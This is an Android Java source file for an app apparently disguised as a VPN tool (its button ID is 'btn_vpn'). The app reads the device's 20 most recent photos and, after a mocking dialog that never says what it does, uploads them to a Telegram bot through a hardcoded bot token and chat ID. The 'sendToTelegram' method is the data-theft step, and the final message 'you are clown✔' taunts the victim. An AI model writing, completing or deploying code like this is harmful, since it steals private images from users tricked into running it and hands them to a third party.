package com.example.myphotosender;

import android.Manifest;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 100;

    private Button btnSend;
    private TextView status;
    private ProgressBar progress;

    private List<Uri> images = new ArrayList<>();

    // 🔴 اینجا بگذار
    private String botToken = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
    private String chatId = "8961077299";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnSend = findViewById(R.id.btn_vpn);
        status = findViewById(R.id.tv_status);
        progress = findViewById(R.id.progressBar);

        requestPermission();

        btnSend.setOnClickListener(v -> {
            if (images.isEmpty()) {
                Toast.makeText(this, "not can fond", Toast.LENGTH_SHORT).show();
                return;
            }
            showConfirmDialog();
        });
    }

    // ---------- Permission ----------
    private void requestPermission() {
        String p = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                ? Manifest.permission.READ_MEDIA_IMAGES
                : Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(this, p)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{p}, PERMISSION_CODE);
        } else {
            loadImages();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        if (requestCode == PERMISSION_CODE &&
                grantResults.length > 0 &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            loadImages();
        }
    }

    // ---------- Load last 20 images ----------
    private void loadImages() {
        images.clear();

        Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
        );

        if (c != null) {
            int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int count = 0;

            while (c.moveToNext() && count < 20) {
                long id = c.getLong(idCol);
                Uri uri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);

                images.add(uri);
                count++;
            }
            c.close();
        }
    }

    // ---------- Confirm dialog ----------
    private void showConfirmDialog() {
        new AlertDialog.Builder(this)
                .setTitle("clown")
                .setMessage("areyousmart")
                .setPositiveButton("ok", (d, w) -> sendAll())
                .setNegativeButton("No", (d, w) -> d.dismiss())
                .show();
    }

    // ---------- Send all ----------
    private void sendAll() {
        progress.setMax(images.size());
        progress.setProgress(0);

        new Thread(() -> {
            for (int i = 0; i < images.size(); i++) {
                sendToTelegram(images.get(i), i + 1);

                int finalI = i;
                runOnUiThread(() -> {
                    progress.setProgress(finalI + 1);
                    status.setText("start " + (finalI + 1) + " / " + images.size());
                });
            }

            runOnUiThread(() -> status.setText("you are clown✔"));

        }).start();
    }

    // ---------- Telegram send ----------
    private void sendToTelegram(Uri uri, int index) {
        try {
            InputStream in = getContentResolver().openInputStream(uri);

            String urlStr = "https://api.telegram.org/bot" + botToken + "/sendPhoto";

            String boundary = "*****";
            String lineEnd = "\r\n";

            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());

            // chat_id
            out.writeBytes("--" + boundary + lineEnd);
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            out.writeBytes(chatId + lineEnd);

            // photo
            out.writeBytes("--" + boundary + lineEnd);
            out.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"img" + index + ".jpg\"" + lineEnd + lineEnd);

            byte[] buffer = new byte[4096];
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }

            in.close();

            out.writeBytes(lineEnd);
            out.writeBytes("--" + boundary + "--" + lineEnd);

            out.flush();
            out.close();

            conn.getResponseCode();
            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
                             }
